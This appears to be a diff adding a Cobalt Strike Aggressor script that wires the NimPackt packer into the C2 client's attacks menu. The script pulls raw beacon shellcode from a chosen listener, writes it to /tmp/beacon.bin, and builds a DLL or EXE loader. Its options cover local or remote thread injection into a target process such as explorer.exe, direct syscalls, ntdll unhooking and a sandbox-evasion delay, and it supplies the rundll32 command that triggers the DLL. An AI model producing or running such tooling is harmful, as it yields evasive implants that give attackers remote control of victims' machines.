@@ -1,0 +1,81 @@
+sub compile {
+        %options = $3;
+
+        # Get the base command based on the chosen option
+        if (%options["injectiontype"] eq "local thread") {
+
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-f", %options["filetype"]);
+
+        }
+        else if (%options["injectiontype"] eq "remote thread, sacrificial process") {
+
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-r", "-t", %options["targetproc"], "-f", %options["filetype"]);
+            
+        }
+        else {
+
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-r", "-E", "-t", %options["targetproc"], "-f", %options["filetype"]);
+
+        }
+
+        # Architecture
+        if (%options["arch86"] eq "true") {
+                $data = artifact_payload(%options["listener"], "raw", "x86");
+                push(@command, "-32")
+        }
+        else {
+                $data = artifact_payload(%options["listener"], "raw", "x64");
+        }
+
+	# Write payload
+	$cradle = openf(">/tmp/beacon.bin");
+	writeb($cradle, $data);
+	closef($cradle);
+
+        # No syscalls
+        if (%options["ns"] eq "true") {
+                push(@command, "-ns")
+        }
+
+        # No API unhooking
+        if (%options["nu"] eq "true") {
+                push(@command, "-nu")
+        }
+
+        # Add sleep
+        if (%options["sleep"] eq "true") {
+                push(@command, "-s")
+        }
+
+        exec(@command);
+
+        show_message("NimPackt initiated, compiling may take some time. Output will be saved to the 'output' folder in your NimPackt installation directory. To trigger dll payloads: 'rundll32 payload.dll,IconSrv'.");
+}
+
+
+popup attacks {
+        item "NimPackt Payload" {
+                local('$dialog %defaults');
+                # setup our defaults
+                %defaults["injectiontype"] = "local thread";
+                %defaults["filetype"] = "dll";
+                %defaults["targetproc"] = "explorer.exe";
+                %defaults["nu"] = "true";
+
+                # create our dialog
+                $dialog = dialog("Generate NimPackt executable binary", %defaults, &compile);
+                dialog_description($dialog, "Generate a NimPackt payload. Select the payload type and behaviour. To trigger dll payloads: 'rundll32 payload.dll,IconSrv'.");
+                drow_listener_stage($dialog, "listener", "Listener: ");
+                drow_combobox($dialog, "injectiontype", "Injection type:", @("local thread", "remote thread, sacrificial process", "remote thread, existing process"));
+                drow_text($dialog, "targetproc",  "Target process (remote injection only):");
+                drow_combobox($dialog, "filetype", "File type:", @("dll", "exe"));
+                drow_checkbox($dialog, "ns", "Direct Syscalls: ", "Do \UNOT\U use direct syscalls to run shellcode.");
+                drow_checkbox($dialog, "nu", "API Unhooking: ", "Do \UNOT\U unhook user-mode API calls (ntdll) in target thread.");
+                drow_checkbox($dialog, "sleep", "Sandbox Evasion: ", "Perform calcluations for 30s-1m before executing.");
+                drow_checkbox($dialog, "arch86", "Architecture: ", "Use x86 payload.");
+                dbutton_action($dialog, "Generate");
+
+                # show our dialog
+                dialog_show($dialog);
+        }
+}
